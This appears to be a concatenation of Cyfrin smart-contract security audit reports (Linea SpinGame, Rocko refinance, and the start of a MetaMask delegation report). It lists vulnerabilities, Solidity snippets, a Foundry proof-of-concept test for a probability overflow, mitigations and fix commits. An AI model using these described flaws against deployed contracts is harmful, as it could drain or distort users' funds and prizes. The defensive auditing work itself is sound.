+ if (winningThreshold < cumulativeProbability ||
+     boostedTotalProbabilities >= BASE_POINT && i == prizeLen - 1 // last iteration and win is guaranteed
+ ) {
      selectedPrizeID = prizeIds[i];
```

This change slightly favors the last prize in the list in extremely rare cases, but given that this situation is already highly improbable, this trade-off is reasonable.

**Linea:** Fixed in commit [`b32e038`](https://github.com/Consensys/linea-hub/commit/b32e038bba336d1ad6dddbdb972de8cafbbb2c1a)

**Cyfrin:** Verified.


### Users can select higher-value NFTs by delaying prize claims

**Description:** When a user wins, the contract only tracks that they have won a specific `prizeID` in [`Spin::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L576-L592):

```solidity
    if (winningThreshold < cumulativeProbability) {
        selectedPrizeId = localPrizeIds[i];

        // ...
        break;
    }
}

userToPrizesWon[user][selectedPrizeId] += 1;
```

However, when a user claims their prize, if the prize is an NFT, the contract simply assigns them the last available NFT in the list in [`Spin::_transferPrize`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L366-L368):

```solidity
uint256 tokenId = prize.availableERC721Ids[
    prize.availableERC721Ids.length - 1
];
```

Since NFTs are non-fungible, each `tokenId` represents a unique item, meaning that a user who wins can wait to claim their prize until the highest-value NFT remains in the collection. This allows them to strategically claim the best available token, potentially at the expense of users who claim their prizes immediately.

**Impact:** Users could delay claiming to secure a more valuable NFT from a collection, while other users who claim immediately may unknowingly receive lower-value tokens. This could create an unfair advantage for informed users who understand the mechanics of prize allocation.

**Recommended Mitigation:** There is no perfect solution, as all potential fixes come with trade-offs. One approach would be to assign a specific NFT at the time of winning in `_fulfillRandomness`. However, this would require tracking both which NFTs each user has won and which remain available, significantly increasing state complexity and gas costs.

Instead, the protocol should be aware of this issue and ensure that NFTs within each prize category have similar values. If a collection includes NFTs with widely varying values, they should be added as separate prizes, ensuring fairer distribution and preventing users from gaming the system.

**Linea:** Acknowledged. Higher value NFTs should be added as separate prizes.

**Cyfrin:** Acknowledged.


### Probability overflow can bypass `MaxProbabilityExceeded` check

**Description:** When adding new prizes, the contract includes a check to ensure that the total probability does not exceed 100% in [`Spin::_addPrizes#L511-L513`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L511-L513):

```solidity
if (totalProbabilities > BASE_POINT) {
    revert MaxProbabilityExceeded(totalProbabilities);
}
```

However, this check can be bypassed due to how `totalProbabilities` is calculated. The accumulation of probabilities happens in `unchecked` blocks at the following locations:

- First accumulation of individual probability values, [`Spin::_addPrizes#L503-L505`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L503-L505):

  ```solidity
  unchecked {
      totalProbIncrease += probability;
  }
  ```

- Final update of `totalProbabilities`, [`Spin::_addPrizes#L508-L510`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L508-L510):

  ```solidity
  unchecked {
      totalProbabilities += totalProbIncrease;
  }
  ```

Because both updates occur within `unchecked` blocks, a very large probability value can overflow, effectively bypassing the `MaxProbabilityExceeded` check. This could allow `totalProbabilities` to wrap around and appear valid, even if it exceeds `BASE_POINT`.

**Impact:** Although this function can only be called by trusted users (e.g., the `CONTROLLER` or `DEFAULT_ADMIN` role), a mistake or a compromised account could still trigger this issue by adding an excessively large probability value. This would cause an overflow, allowing the ``MaxProbabilityExceeded check to be bypassed and potentially breaking the integrity of the game by distorting the prize distribution.

**Proof of Concept:** Add the following test to `Spin.t.sol`:
```solidity
function testUpdateWithMoreThanMaxProba() external {
    MockERC721 nft = new MockERC721("Test NFT", "TNFT");
    nft.mint(address(spinGame), 10);
    nft.mint(address(spinGame), 21);

    ISpinGame.Prize[] memory prizesToUpdate = new ISpinGame.Prize[](2);
    uint256[] memory empty = new uint256[](0);

    uint256[] memory nftAvailable = new uint256[](2);
    nftAvailable[0] = 10;
    nftAvailable[1] = 21;

    prizesToUpdate[0] = ISpinGame.Prize({
        tokenAddress: address(nft),
        amount: 0,
        lotAmount: 2,
        probability: type(uint64).max - 1,
        availableERC721Ids: nftAvailable
    });

    prizesToUpdate[1] = ISpinGame.Prize({
        tokenAddress: address(0),
        amount: 1e18,
        lotAmount: 2,
        probability: 2,
        availableERC721Ids: empty
    });

    vm.prank(admin);
    spinGame.updatePrizes(prizesToUpdate);

    assertEq(spinGame.getPrize(1).probability, type(uint64).max - 1);
}
```

**Recommended Mitigation:** Consider removing the `unchecked` blocks in both calculations.

**Linea:** Fixed in commit [`e840e2f`](https://github.com/Consensys/linea-hub/commit/e840e2f04dca6006ac7b5782765c58e7a6869603)

**Cyfrin:** Verified.

\clearpage
## Informational


### Scaling `winningThreshold` incorrectly reduces randomness distribution

**Description:** When a user has a boost that results in a >100% probability of winning, the contract adjusts `winningThreshold` to match `boostedTotalProbabilities` in [`Spin::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L534-L557):

```solidity
uint256 winningThreshold = _randomness % BASE_POINT;

// ...

if (boostedTotalProbabilities > BASE_POINT) {
    winningThreshold =
        (winningThreshold * boostedTotalProbabilities) /
        BASE_POINT;
}
```

The issue here is that `_randomness` is first scaled down to `BASE_POINT` before being scaled up to `boostedTotalProbabilities`. This process reduces the effective randomness (entropy) because some values in the original `_randomness` range will no longer be represented in the final `winningThreshold` after scaling. As a result, the final threshold may not be evenly distributed, potentially introducing bias.

Consider applying `_randomness` directly to `boostedTotalProbabilities` when the win probability exceeds 100%, ensuring no loss of entropy:

```diff
  if (boostedTotalProbabilities > BASE_POINT) {
-     winningThreshold =
-         (winningThreshold * boostedTotalProbabilities) /
-         BASE_POINT;

+     winningThreshold = _randomness % boostedTotalProbabilities;
  }
```

This preserves the full randomness range and ensures a more uniform distribution of possible winning thresholds.

**Linea:** Fixed in commit [`37a18ca`](https://github.com/Consensys/linea-hub/commit/37a18ca60b8e503643b5b6e996e9a0cd7c257ec2)

**Cyfrin:** Verified.


### Native token transfers lack explicit balance check

**Description:** One possible prize type is native tokens, represented by `tokenAddress = address(0)`. A user who wins native tokens can claim them in [`Spin::_transferPrize`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L347-L352):

```solidity
if (prize.tokenAddress == address(0)) {
    (bool success, ) = _winner.call{value: prize.amount}("");
    if (!success) {
        revert NativeTokenTransferFailed();
    }
} else {
```

For ERC20 prizes ([handled here](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L353-L362)) and ERC721 prizes ([handled here](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L369-L371)), the contract explicitly checks whether it has a sufficient balance or ownership of the token before proceeding with the transfer.

While the current implementation would still revert if the contract lacks the required native token balance, consider adding an explicit balance check for native tokens as it would provide consistency across all prize types and ensure uniform error messages, improving usability and debugging.

**Linea:** Fixed in commit [`7675766`](https://github.com/Consensys/linea-hub/commit/7675766ba45bd87888897ac130a587a45e47e96b)

**Cyfrin:** Verified.


### Race Condition in `updatePrizes` Leading to Unexpected Prizes

**Description:** The `updatePrizes` function allows modifying the list of available prizes. However, it does not consider ongoing participations where the randomness request has not yet been fulfilled, leaving some participants without an assigned prize ID. This means a participant can initiate a spin, and before the VRF provides the random number, the `updatePrizes` function can be called. As a result, the prize mapping is updated, causing the participant to receive a prize from a different list than the one they originally played for.

**Impact:** Participants may receive prizes from an updated list rather than the one that was active when they initially participated.

**Proof of Concept:**
1. A participant initiates a spin.
2. Before the VRF fulfills the randomness request, updatePrizes is called, modifying the prize distribution.
3. The participant then receives a prize from the updated list rather than the expected one.

**Recommended Mitigation:** Ensure that all pending VRF requests are fulfilled before allowing any updates to the prize list.

**Linea:** Acknowledged. Acceptable behavior.

**Cyfrin:** Acknowledged.


### Assembly blocks could benefit from `"memory-safe"` annotation

**Description:** When hashing request data in [`Spin::_hashParticipation`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L383-L409) and [`Spin::_hashClaim`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L411-L438), inline assembly is used to efficiently compute the hash:
```solidity
assembly {
    let mPtr := mload(0x40)
    mstore(
        mPtr,
        0x4635ca970da82693e235d3cdaa3678d42c6824330c48b4135f080d655e54da78 // keccak256("ClaimRequest(address user,uint256 expirationTimestamp,uint64 nonce,uint32 prizeId)")
    )
    mstore(add(mPtr, 0x20), _user)
    mstore(add(mPtr, 0x40), _expirationTimestamp)
    mstore(add(mPtr, 0x60), _nonce)
    mstore(add(mPtr, 0x80), _prizeId)
    claimHash := keccak256(mPtr, 0xa0)
}
```

To improve compiler optimizations, consider adding a [`memory-safe`](https://docs.soliditylang.org/en/latest/assembly.html#memory-safety) annotation to the assembly block:

```diff
+ assembly ("memory-safe") {
```

Since the assembly block only accesses memory after the free memory pointer (`0x40`), this annotation poses no risk and can allow the Solidity compiler to apply additional optimizations, improving gas efficiency.

**Linea:** Fixed in commit [`b4aaffc`](https://github.com/Consensys/linea-hub/commit/b4aaffc43e496b085e54ef2b08397fcb3c310e68)

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-03-19-cyfrin-linea-spingame-v2.0.md ------


------ FILE START car/reports_md/2025-03-28-cyfrin-rocko-refinance-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Hans](https://x.com/hansfriese)
**Assisting Auditors**



---

# Findings
## Low Risk


### Protocol fee should round up in favor of the protocol

**Description:** Protocol fee should round up in favor of the protocol in `onMorphoFlashLoan`:
```solidity
uint256 rockoFeeBP = ROCKO_FEE_BP;
if (rockoFeeBP > 0) {
    unchecked {
        feeAmount = (flashBorrowAmount * rockoFeeBP) / BASIS_POINTS_DIVISOR;
        borrowAmountWithFee += feeAmount;
    }
}
```

Consider [using](https://x.com/DevDacian/status/1892529633104396479) OpenZeppelin [`Math::mulDiv`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fda6b85f2c65d146b86d513a604554d15abd6679/contracts/utils/math/Math.sol#L280) with the rounding parameter or Solady [`FixedPointMathLib::fullMulDivUp`](https://github.com/Vectorized/solady/blob/c9e079c0ca836dcc52777a1fa7227ef28e3537b3/src/utils/FixedPointMathLib.sol#L548).

Another benefit of using these libraries is that intermediate overflow from the multiplication of `flashBorrowAmount * rockoFeeBP` is avoided.

**Rocko:** Fixed in commit [a59ba0e](https://github.com/getrocko/onchain/commit/a59ba0e7958c544ad95788ce29923a342a2ea35a).

**Cyfrin:** Verified.


### Refinancing reverts for `USDT` debt token

**Description:** Refinancing reverts for `USDT` debt token due to the way protocol uses standard `IERC20::approve` and `transfer` functions.

**Impact:** Refinancing is bricked for `USDT` debt tokens. Marked as Low severity as officially only `USDC` is supported at this time. Note the implementation of `USDT` is different across chains; the protocol "as-is" would work with `USDT` on Base but not on Ethereum mainnet.

**Proof of Concept:** As part of the audit we have provided a fork fuzz testing suite; run this command: `forge test --fork-url ETH_RPC_URL --fork-block-number 22000000 --match-test test_FuzzRefinance_AaveToCompound_DepWeth_BorUsdt -vvv`

**Recommended Mitigation:** Replace all uses of `IERC20::approve` with [`SafeERC20::forceApprove`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L101-L108) and `IERC20::transfer` with `SafeERC20::safeTransfer` at L738, then re-run the PoC test and it now passes.

Ideally for added safety to prevent front-running of changes to existing approvals, use [`SafeERC20::safeIncreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L68-L71) and [`safeDecreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L82-L90) where suitable (for example in `_revokeTokenSpendApprovals` when the previous allowance amount is known could instead use `safeDecreaseAllowance`).

**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).

**Cyfrin:** Verified.

\clearpage
## Informational


### Error messages hardcode `USDC` but other debt tokens may be used

**Description:** Error messages hardcode `USDC` but other token may be used, eg:
```solidity
function _closeLoanPositionAndReturnCollateralBalance(
    // @audit debt token can be other tokens apart from USDC but error
    // message hardcodes USDC
    require(
        debtBalance <= IERC20(debtTokenAddress).balanceOf(FLASH_LOAN_CONTRACT),
        "Insufficient USDC available in the flash contract"
    );
```

This code in `onMorphoFlashLoan` also assumes the debt token will be USDC:
```solidity
uint256 usdcBalance = IERC20(ctx.debtTokenAddress).balanceOf(FLASH_LOAN_CONTRACT);
bool feeAmountAvailable = usdcBalance >= feeAmount;
```

**Rocko:** Fixed in commit [ec9f5be](https://github.com/getrocko/onchain/commit/ec9f5be20f9249cd20fcc1e173192361ecd97ef5).

**Cyfrin:** Verified.


### Events missing indexed parameters

**Description:** Events in Solidity can have up to three indexed parameters, which are stored as topics in the event log. Indexed parameters allow for efficient filtering and searching of events by off-chain services. Without indexed parameters, it becomes more difficult and resource-intensive for applications to filter for specific events.

There are instances of events missing indexed parameters that could be improved.
```solidity
    event LogRefinanceLoanCall(
        string logType,
        address rockoWallet,
        string from,
        string to,
        uint256 debtBalance,
        address debtTokenAddress,
        address collateralTokenAddress,
        address aCollateralTokenAddress,
        Id morphoMarketId
    );
    event LogFlashLoanCallback(
        string logType,
        address rockoWallet,
        string from,
        string to,
        address debtTokenAddress,
        address collateralTokenAddress,
        address aCollateralTokenAddress,
        uint256 flashBorrowAmount,
        bytes data,
        Id morphoMarketId
    );
```

**Recommended Mitigation:** Add the `indexed` keyword to important parameters in the event that would commonly be used for filtering, such as `rockoWallet`, `debtTokenAddress`, and `collateralTokenAddress`.

**Rocko:** Fixed in commit [f5c9c80](https://github.com/getrocko/onchain/commit/f5c9c8051d5ba1bf04774ae6e8aa407aeddbcde1).

**Cyfrin:** Verified.


### Unnecessary event emission when configuration values do not change

**Description:** `RockoFlashRefinance::updateFee` updates the `ROCKO_FEE_BP` variable and emits a `FeeUpdated` event regardless of whether the new fee value is different from the current one. This leads to unnecessary event emissions when the owner calls the function with the same fee value that is already set.
The function `pauseContract` can be improved similarly too.

**Rocko:** Fixed in commit [99a73dc](https://github.com/getrocko/onchain/commit/99a73dc20fce34811c224fdd46b7e173748bfeb8).

**Cyfrin:** Verified.


### Inconsistent implementation approach for retrieving collateral balance from Morpho

**Description:** `RockoFlashRefinance::_collateralBalanceOfMorpho` uses direct storage slot access to retrieve a user's collateral balance from Morpho, while similar functionality for debt retrieval is implemented using `MorphoLib`. This inconsistency in the implementation approach makes the code less readable and maintainable.
```solidity
    function _collateralBalanceOfMorpho(
        Id morphoMarketId,
        address rockoWallet
    ) private view returns (uint256 totalCollateralAssets) {//@audit-issue use MorphoLib::collateral instead
        bytes32[] memory slots = new bytes32[](1);
        slots[0] = MorphoStorageLib.positionBorrowSharesAndCollateralSlot(morphoMarketId, rockoWallet);
        bytes32[] memory values = MORPHO.extSloads(slots);
        totalCollateralAssets = uint256(values[0] >> 128);
    }

    function _getMorphoDebtAndShares(Id marketId, address rockoWallet) private returns (uint256 debt, uint256 shares) {
        MarketParams memory marketParams = MORPHO.idToMarketParams(marketId);
        MORPHO.accrueInterest(marketParams);

        uint256 totalBorrowAssets = MORPHO.totalBorrowAssets(marketId);
        uint256 totalBorrowShares = MORPHO.totalBorrowShares(marketId);
        shares = MORPHO.borrowShares(marketId, rockoWallet);
        debt = shares.toAssetsUp(totalBorrowAssets, totalBorrowShares);
    }
```

**Recommended Mitigation:** Refactor `_collateralBalanceOfMorpho` to use `MorphoLib::collateral` for consistency with other parts of the codebase:

```diff
function _collateralBalanceOfMorpho(
    Id morphoMarketId,
    address rockoWallet
) private view returns (uint256 totalCollateralAssets) {
-    bytes32[] memory slots = new bytes32[](1);
-    slots[0] = MorphoStorageLib.positionBorrowSharesAndCollateralSlot(morphoMarketId, rockoWallet);
-    bytes32[] memory values = MORPHO.extSloads(slots);
-    totalCollateralAssets = uint256(values[0] >> 128);
+    totalCollateralAssets = MorphoLib.collateral(MORPHO, morphoMarketId, rockoWallet);
}
```

**Rocko:** Fixed in commit [5ef86b4](https://github.com/getrocko/onchain/commit/5ef86b44063a988afed93fe3f69074be757768bd).

**Cyfrin:** Verified.


### Insufficient data length validation in `onMorphoFlashLoan`

**Description:** `RockoFlashRefinance::onMorphoFlashLoan` performs a basic check on the length of the `data` parameter, requiring it to be at least 20 bytes. However, this check is insufficient as the actual data being sent is much larger, containing multiple addresses, strings, and an Id parameter. The minimum expected data length should be at least 256 bytes plus additional bytes for dynamic string data.

**Recommended Mitigation:**
```diff
-        require(data.length >= 20, "Invalid data");
+        require(data.length >= 256, "Invalid data");
```

**Rocko:** Fixed in commit [1da67d7](https://github.com/getrocko/onchain/commit/1da67d7f3ae8076a6cc135ef9a6e5595ad6e29a2).

**Cyfrin:** Verified.


### In `_withdrawAaveCollateral` fetch `aTokenAddress` from Aave instead of receiving as input in `refinance` as passing it to morpho and back again

**Description:** Aave's `aTokenAddress` is only required when withdrawing collateral in `_withdrawAaveCollateral`, but currently it is:
* passed in as input to `refinance`
* has some validation performed on it
* encoded along with other data and sent to `Morpho::flashLoan`
* then Morpho passes it back when calling `onMorphoFlashLoan`
* where it is decoded again and passed around some more

Instead of all this, simply use Aave's API function [`IPool::getReserveData`](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/interfaces/IPool.sol#L582) to get the correct `aTokenAddress` inside `_withdrawAaveCollateral` where it is required:
```solidity
    function _withdrawAaveCollateral(
        address collateralAddress,
        uint256 collateralBalance,
        address rockoWallet
    ) private {
        DataTypes.ReserveData memory reserveData = AAVE.getReserveData(collateralAddress);

        // Rocko Wallet needs to send aToken here after debt is paid off
        // Be sure that Rocko Wallet has approved this contract to spend aTokens for > `collateralBalance` tokens
        _pullTokensFromCallerWallet(reserveData.aTokenAddress, rockoWallet, collateralBalance);

        // function withdraw(address asset, uint256 amount, address to)
        AAVE.withdraw(collateralAddress, collateralBalance, FLASH_LOAN_CONTRACT);
    }
```

Fetching this parameter via Aave's API removes unnecessary code/validations also decreases the attack surface.

**Rocko:** Fixed in commit [d793f96](https://github.com/getrocko/onchain/commit/d793f960598240fa3eacdc6a4ec67d55dcfa2a75).

**Cyfrin:** Verified.


### Provide a way for users to revoke all approvals

**Description:** `RockoFlashRefinance` is designed to move existing loan positions from one lending protocol to another. On behalf of the user the contract must be able to:
* close the loan from the previous lending provider
* open a new loan on the new lending provider

For Aave, users must allow the refinance contract to spend the [AToken](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/tokenization/AToken.sol) to close the position and to spend the [VariableDebtToken](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/tokenization/VariableDebtToken.sol) to open a new position.

For Compound (Comet), users must allow the refinance contract by calling the [allow function](https://github.com/compound-finance/comet/blob/68cd639c67626c86e890e5aac775ad4b6405d923/contracts/CometExt.sol#L162C14-L162C19).

For Morpho, users must authorize the refinance protocol by calling the [setAuthorization](https://github.com/morpho-org/morpho-blue/blob/9e2b0755b47bbe5b09bf1be8f00e060d4eab6f1c/src/Morpho.sol#L437C14-L437C30) function.

The protocol team provided their frontend source related to these approvals and there were only "approving" support, not revoking. It is recommended to provide an easy way for users to revoke all these approvals.

**Rocko:** Users revokes will be included in the batch transaction when called from the Rocko app.


### Consider allowing update to `AAVE_DATA_PROVIDER`

**Description:** `RockoFlashRefinance::AAVE_DATA_PROVIDER` immutably stores the address of `AaveProtocolDataProvider`. However `AaveProtocolDataProvider` is not upgradeable and the "current" one on mainnet was deployed 43 days ago to address 0x497a1994c46d4f6C864904A9f1fac6328Cb7C8a6.

Hence consider whether `AAVE_DATA_PROVIDER` should not be `immutable` and an `onlyOwner` function should exist to allow updating it in the future.

Since `RockoFlashRefinance` has no relevant internal state it can just be re-deloyed. The trade-off is having  `immutable` `AAVE_DATA_PROVIDER` means user transactions involving it cost slightly less gas but the contract needs to be re-deployed to update it.

**Rocko:** Acknowledged; prefer the current setup for lower user gas costs.

\clearpage
## Gas Optimization


### Use `ReentrancyGuardTransient` instead of `ReentrancyGuard` or more gas-efficient `nonReentrant` modifiers

**Description:** Use [`ReentrancyGuardTransient`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) instead of `ReentrancyGuard` for more gas-efficient `nonReentrant` modifiers. The OpenZeppelin version would need to be bumped to 5.1.

**Rocko:** Fixed in commit [675f4b2](https://github.com/getrocko/onchain/commit/675f4b2e59cddf6c3f9f2e866f4401564bd0a006).

**Cyfrin:** Verified.


### Remove obsolete check in `updateFee`

**Description:** Remove obsolete check in `updateFee`:
```diff
-        require(newFee >= 0, "Fee must not be negative");
```

This check is obsolete since `newFee` is declared as `uint256` therefore cannot be negative.

**Rocko:** Fixed in commit [2c50838](https://github.com/getrocko/onchain/commit/2c50838a5cc5e498a14874a5d3348da20087e6bc).

**Cyfrin:** Verified.


### Use `msg.sender` instead of `owner()` inside `onlyOwner` functions

**Description:** Using `msg.sender` instead of `owner()` inside `onlyOwner` functions is more efficient as it eliminates reading from storage. It is also safe since the `onlyOwner` modifier ensures that `msg.sender` is the owner:
```solidity
757:        IERC20(tokenAddress).safeTransfer(owner(), amount);
766:        (bool success, ) = owner().call{ value: amount }("");
```

**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).

**Cyfrin:** Verified.


### Prevent repetitive hashing of identical strings

**Description:** `RockoFlashRefinance::_compareStrings` is often called with the same values resulting in duplicate unnecessary work. A simple and more efficient way to prevent this is by first performing the conversion using `_parseProtocol` for both `from`/`to` inputs then simply comparing the enums as needed in functions like `refinance` and `_revokeTokenSpendApprovals`.

If string comparisons are required:
* hard-code the hash result as `bytes32` constants for common expected strings such as "aave", "morpho", "compound" and using these hard-coded constants inside `_parseProtocol` and other functions
* in functions such as `RockoFlashRefinance::refinance`, cache the hash of the `from`/`to` inputs in local `bytes32` variables and use the cached hashes and the hard-coded constants for the comparisons

One simple way to achieve this is by:
* defining a function to return the hash of a string:
```solidity
    function _hashString(string calldata input) private pure returns (bytes32 output) {
        output = keccak256(bytes(input));
    }
```
* changing `_compareStrings` to take two `bytes32` as input:
```solidity
    function _compareStrings(bytes32 a, bytes32 b) private pure returns (bool) {
        return a == b;
    }
```

Consider OpenZeppelin's string equality [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Strings.sol#L134-L136) as well.

**Rocko:** Fixed in commit [a59ba0e](https://github.com/getrocko/onchain/commit/a59ba0e7958c544ad95788ce29923a342a2ea35a).

**Cyfrin:** Verified.


### Don't initialize to default values

**Description:** Don't initialize to default values as Solidity already does this:
```solidity
78:        ROCKO_FEE_BP = 0;
597:        uint256 debtBalance = 0;
598:        uint256 morphoDebtShares = 0;
```

**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).

**Cyfrin:** Verified.


### Use named return variables to eliminate redundant local variables and `return` statements

**Description:** Use named return variables to eliminate redundant local variables and `return` statements:
```diff
// _closeLoanPositionAndReturnCollateralBalance L457
-    ) private returns (uint256) {
+    ) private returns (uint256 collateralBalance) {

// L464
-        uint256 collateralBalance;

// L480
-        return collateralBalance;
```

Same idea can be applied to `_collateralBalanceOfAave`, `_getDebtBalanceOfAave`.

**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).

**Cyfrin:** Verified.


### Remove redundant `onBehalfOf` variables

**Description:** Remove redundant `onBehalfOf` variables:
```diff
    function _supplyToAave(address collateralAddress, uint256 collateralBalance, address rockoWallet) private {
-       address onBehalfOf = rockoWallet;
-       AAVE.supply(collateralAddress, collateralBalance, onBehalfOf, AAVE_REFERRAL_CODE);
+       AAVE.supply(collateralAddress, collateralBalance, rockoWallet, AAVE_REFERRAL_CODE);
    }
    function _borrowFromAave(address rockoWallet, address token, uint256 borrowAmount) private {
-       address onBehalfOf = rockoWallet;
-       AAVE.borrow(token, borrowAmount, AAVE_INTERESTE_RATE_MODE, AAVE_REFERRAL_CODE, onBehalfOf);
+       AAVE.borrow(token, borrowAmount, AAVE_INTERESTE_RATE_MODE, AAVE_REFERRAL_CODE, rockoWallet);
    }
```

**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).

**Cyfrin:** Verified.


### Remove redundant `morphoMarketId` validation checks in `_closeLoanMorphoWithShares` and `_openLoanPosition`

**Description:** `RockoFlashRefinance::_closeLoanMorphoWithShares` and `_openLoanPosition` contain redundant validation `morphoMarketId`. The reasons why this validation is redundant:

* `RockoFlashRefinance::refinance` already validates the input `morphoMarketId`, encodes it into the `data` payload then calls `Morpho::flashLoan` with the `data` payload:
```solidity
if (_compareStrings(to, "morpho") || _compareStrings(from, "morpho")) {
    require(_isValidId(morphoMarketId), "Morpho Market ID required for Morpho refinance");
}

bytes memory data = abi.encode(
    rockoWallet,
    from,
    to,
    debtTokenAddress,
    collateralTokenAddress,
    aCollateralTokenAddress,
    morphoMarketId,
    morphoDebtShares
);

MORPHO.flashLoan(debtTokenAddress, debtBalance, data);
```

* `Morpho::flashLoan` always passes the unmodified `data` payload to `RockoFlashRefinance::onMorphoFlashLoan`:
```solidity
function flashLoan(address token, uint256 assets, bytes calldata data) external {
    require(assets != 0, ErrorsLib.ZERO_ASSETS);

    emit EventsLib.FlashLoan(msg.sender, token, assets);

    IERC20(token).safeTransfer(msg.sender, assets);

    // @audit passing unmodified `data` payload to `onMorphoFlashLoan`
    IMorphoFlashLoanCallback(msg.sender).onMorphoFlashLoan(assets, data);

    IERC20(token).safeTransferFrom(msg.sender, address(this), assets);
}
```

*`RockoFlashRefinance::onMorphoFlashLoan` decodes the unmodified `data` payload and calls `_closeLoanMorphoWithShares` and `_openLoanPosition` using the decoded `morphoMarketId` which has already been validated in `RockoFlashRefinance::refinance`.

**Recommended Mitigation:** Remove the redundant `morphoMarketId` validation checks at:
```solidity
325: require(_isValidId(morphoMarketId), "Invalid Morpho Market ID");

503: require(_isValidId(morphoMarketId), "Morpho Market ID required for Morpho refinance");
```

**Rocko:** Fixed in commit [5a9aa7d](https://github.com/getrocko/onchain/commit/5a9aa7d3cfb80150448608854440c285ea08fa53).

**Cyfrin:** Verified.


### Redundant collateral balance check in `_openLoanMorpho`

**Description:** `RockoFlashRefinance::_openLoanMorpho` contains a redundant check for collateral balance availability. The function verifies that the flash loan contract has sufficient collateral balance, but this check is already performed in the calling `_openLoanPosition` function.

**Recommended Mitigation:**
```diff
    function _openLoanMorpho(
        Id morphoMarketId,
        uint256 borrowAmount,
        address collateralAddress,
        uint256 collateralBalance,
        address rockoWallet
    ) private {
        _checkAllowanceAndApproveContract(address(MORPHO), collateralAddress, collateralBalance);
        MarketParams memory marketParams = MORPHO.idToMarketParams(morphoMarketId);
-       uint256 flashLoanContractBalance = IERC20(collateralAddress).balanceOf(FLASH_LOAN_CONTRACT);
-       // emit LogBalance("Flash Loan Contract Balance", flashLoanContractBalance);
-       require(
-           flashLoanContractBalance >= collateralBalance,
-           "Insufficient collateral available in the flash contract"
-       );
```

**Rocko:** Fixed in commit [a8efb43](https://github.com/getrocko/onchain/commit/a8efb43b10673508e1fd184aec23a5373f73cd5d).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-03-28-cyfrin-rocko-refinance-v2.0.md ------


------ FILE START car/reports_md/2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Draiakoo](https://x.com/Draiakoo)

**Assisting Auditors**



---

# Findings
## Medium Risk


### Streaming enforcers increase token spending even without actual token transfer

**Description:** The streaming enforcers (`ERC20StreamingEnforcer` and `NativeTokenStreamingEnforcer`) are vulnerable to a token spend allowance depletion attack when used with the `EXECTYPE_TRY` execution mode. The issue exists because both enforcers update the spent amount in the `beforeHook` method, prior to the actual token transfer taking place.

In `ERC20StreamingEnforcer.sol`, the vulnerability occurs in the `_validateAndConsumeAllowance` function:

```solidity
function _validateAndConsumeAllowance(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash,
    address _redeemer
)
    private
{
    // ... validation code ...

    uint256 transferAmount_ = uint256(bytes32(callData_[36:68]));

    require(transferAmount_ <= _getAvailableAmount(allowance_), "ERC20StreamingEnforcer:allowance-exceeded");

    // @issue This line increases the spent amount BEFORE the actual transfer happens
    allowance_.spent += transferAmount_;

    emit IncreasedSpentMap(/* ... */);
}
```

Similarly, in `NativeTokenStreamingEnforcer.sol`:

```solidity
function _validateAndConsumeAllowance(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash,
    address _redeemer
)
    private
{
    (, uint256 value_,) = _executionCallData.decodeSingle();

    // ... validation code ...

    require(value_ <= _getAvailableAmount(allowance_), "NativeTokenStreamingEnforcer:allowance-exceeded");

    // @issue This line increases the spent amount BEFORE the actual native token transfer
    allowance_.spent += value_;

    emit IncreasedSpentMap(/* ... */);
}
```
